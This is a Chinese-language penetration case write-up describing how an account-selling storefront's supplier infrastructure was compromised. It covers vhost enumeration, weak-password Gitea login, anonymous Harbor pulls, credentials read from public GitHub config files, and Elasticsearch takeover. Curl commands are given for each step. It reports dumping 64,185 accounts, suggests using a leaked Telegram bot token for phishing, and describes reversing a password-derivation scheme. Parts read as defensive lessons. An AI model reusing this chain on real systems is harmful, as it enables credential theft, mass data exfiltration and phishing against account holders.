# 案例：账号商城供应链横切（脱敏存档）

**形态**：Vue3/Vite SPA + ASP.NET Core API；Gmail/iCloud/社交账号售卖 + 接码 API + Cookie 交付；
配套 `gmail_manager`（账号工厂/任务调度）、`MailSystem`（库存主库）、代理池、TG 客服与告警 bot。
**结论**：品牌站应用侧未突破；改打**供应商运维栈** → 日志库接管 → 拖库（64,185 账号，其中 52,407 活号）。

## 一、同 IP 14 个 vhost（单 IP 承载全栈）

| Host 角色 | 服务 | 状态 |
|---|---|---|
| 商城前台 / `api.` | 前台 + API | 公网可达（加固） |
| 应用本体 API（内网域） | 业务 API | nginx IP 白名单（仅内网） |
| `git.` | Gitea | **员工弱口令可登录** |
| `hub.` | Harbor v2.11.1 | **public 项目匿名可拉** |
| `es.` | Elasticsearch 7.15.2 | **弱口令 → 完全接管** |
| `kb.` | Kibana 7.15.1 | 同口令可登录 |
| `up.` | Uptime Kuma | 登录保护（泄露监测对象 + 时区） |
| `oss.` / `oss-api.` | MinIO 控制台 / S3 API | 部分桶可读 |
| `ip.` | 厂商自研 IP 归属服务 | 公开 |
| 生产库 `8.x.x.x:5858` | MSSQL | **全端口 filtered（仅内网）** |

全端口扫描：该 IP 只开 **80/443**，其余 65525 端口 filtered ⇒ **vhost 是唯一入口**。

## 二、六段链（复现顺序）

```
A 应用侧黑盒穷尽           → 全阴，判死（见第三节）
B 同 IP vhost 枚举          → 英文 5000 + 中文拼音 470 → 挖出 7 个基础设施服务
C 供应商代码仓库            → Gitea 员工弱口令(团队默认口令复用) → 框架源码 NetAdmin
D 容器镜像仓库              → Harbor library 项目 public → 匿名拉 7 镜像 → AdmSettings.json / SeedData / .pdb
E 厂商公开源码仓库          → GitHub org 52 仓库 → appsettings.Remote.json(生产 MSSQL 连接串)
                                                + appsettings.Test.json(ES elastic 口令 / MinIO AK+SK)
F 日志库接管 → 拖库         → match_phrase: responseBody="loginPassword" → scroll → 去重
```

关键命令：

```bash
# B 裸 IP + Host 头（证书 SAN 提供第一批候选）
curl -sk https://<IP>/ -H 'Host: git.<org>.top' -o /dev/null -w '%{http_code}\n'
curl -sk https://<IP>/ -H 'Host: es.<org>.top'  -o /dev/null -w '%{http_code}\n'   # 401 security_exception

# C Gitea 员工登录（303 = 成功，不是 200）
curl -sk -X POST https://git.<org>.top/user/login -d 'user_name=<员工>&password=<团队默认口令>'

# D Harbor 匿名拉
curl -sk "https://hub.<org>.top/api/v2.0/projects"            # library {metadata.public:"true"}
curl -sk "https://hub.<org>.top/service/token?service=harbor-registry&scope=repository:library/<p>:pull"

# E 厂商公开仓库直读配置
curl -s "https://raw.githubusercontent.com/<org>/<repo>/<branch>/appsettings.Remote.json"   # 生产连接串
curl -s "https://raw.githubusercontent.com/<org>/<repo>/<branch>/appsettings.Test.json"     # ES / MinIO

# F 日志库盘点 + 锚定
curl -sk -u elastic:<P> "https://es.<org>.top/_cat/indices?v&h=index,docs.count,store.size&s=store.size:desc"
```

## 三、死路清单（照抄，别重复走）

| 方向 | 结果 | 原因 |
|---|---|---|
| SQL 注入 | 无 | EF Core 全参数化；类型错即 400 |
| 全动词 × 30 个 admin 端点 | 0 异常 | 授权无死角（含 export/download） |
| IDOR / 越权参数 | 无 | `userId`/`ids` 被忽略；订单号尾数真随机 |
| 订单号枚举 | 不可行 | `<前缀>+时间戳+4位随机`，实测真随机 |
| 支付回调 / IPN 伪造 | 无 | 无对外回调端点（50+ 路径全 404/405） |
| 客户端金额篡改 | 无 | 服务端重算；数量边界拦截；下限校验 |
| JWT 攻击 | 无 | 无 kid/jku；算法侧无支点；模板默认密钥**不适用** |
| Token 载体 / 掩码 token | 无 | 只接受合法签名的 `Authorization: Bearer` |
| 路径规范化 / Host 头 / 覆盖头 | 无 | 与 SPA 兜底一致 |
| 竞态 | 低危 | 注册 500（唯一约束兜底）；10 并发 API key 轮换 → 10 个 active key 并存 |
| 内网应用域 | 403 | nginx 按**真实 TCP 源 IP** 判白名单，伪造 `X-Forwarded-For` 无效 |
| 生产库 5858 | 不可达 | 防火墙 filtered |
| 管理员弱口令 | 中 | 口令校验通过但提示"账号已禁用" ⇒ 存在历史弱口令管理员残留 |
| 越权统计字段 | 低 | `/api/dashboard/stats` 对普通用户返回全站余额合计 |
| 用户名枚举 | 低 | 注册重名返回"用户名已存在" ⇒ 可枚举存量账号 |

> **价值**：这份死路清单本身是交付物之一 —— 它证明"主站穷尽"是真的穷尽，也把后续复用者的时间省掉。

## 四、附带收获（同一日志库）

- 应用日志 `requestUrl` 字段**未打码**记录了 `https://api.telegram.org/bot<id>:<token>/setWebhook|sendMessage`
  → 只读 `getMe` 验证有效（账号封禁告警 bot）→ 可冒充官方推送"账号异常/补缴保证金"类钓鱼。
  ⇒ 日志脱敏必须覆盖**含 token 的完整 URL**，不只是 body。
- 框架口令派生 `Pwd(pw) = HMAC-MD5(key=MD5_hex(pw), msg=pw)` + `SeedData` 哈希 → 反推团队默认口令。

## 五、可复用教训

1. **业务站加固 ≠ 运营体系加固**：唯一没守住的是"运维栈 + 日志采集"，而它一次就把全量账号端出去。
2. **日志采集策略决定拖库成本**：记录 request/response body 的日志库 = 数据库镜像 ⇒ 报告里把"日志脱敏"列为首修项。
3. **产品线通用缺陷的边界要写清**：厂商硬编码密钥是事实、目标不适用也是事实，两条都写才可信。
4. **只读边界留证**：ES 只用 `_search`/`_scroll`，Harbor 只 pull，镜像只解包，Gitea 只浏览；`/probe/exit|offline` 记录未调用。
5. **教训（错误示范）**：测试期产生过一个异常大额待支付充值单 —— 支付链任何写动作都应绝对避免；该账号随即被平台风控禁用，说明目标具备主动监控能力。
